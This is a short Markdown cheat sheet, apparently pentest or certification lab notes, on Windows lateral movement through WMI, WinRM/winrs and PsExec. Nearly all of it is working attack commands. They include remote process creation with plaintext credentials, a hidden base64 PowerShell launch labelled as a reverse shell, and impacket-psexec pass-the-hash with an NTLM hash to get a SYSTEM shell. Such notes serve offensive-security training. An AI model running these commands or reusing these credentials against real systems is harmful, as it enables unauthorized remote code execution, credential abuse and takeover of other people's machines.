# WMI / WinRM / PsExec

## WMI (Windows Management Instrumentation)

> WMI (DCOM/RPC): initial connection on port 135, then dynamic high ports (49152–65535 on modern Windows).

```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.72 -Credential $credential -SessionOption $options

Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'cmd /c <payload>'}
```

---

## WinRM / winrs

> WinRM: port 5985 (HTTP) or 5986 (HTTPS).

```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"

# Reverse shell
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <BASE64>"
```

```powershell
# PowerShell Remoting
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1
```

---

## PsExec

**Prerequisites:**
1. User must be in local Administrators group
2. ADMIN$ share must be available
3. File and Printer Sharing must be on (default on modern Windows Server)

```cmd
# Official Sysinternals PsExec (does NOT support password hashes)
PsExec.exe -i \\files04 corp.com\jeff cmd

# impacket-psexec (always gives SYSTEM shell)
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
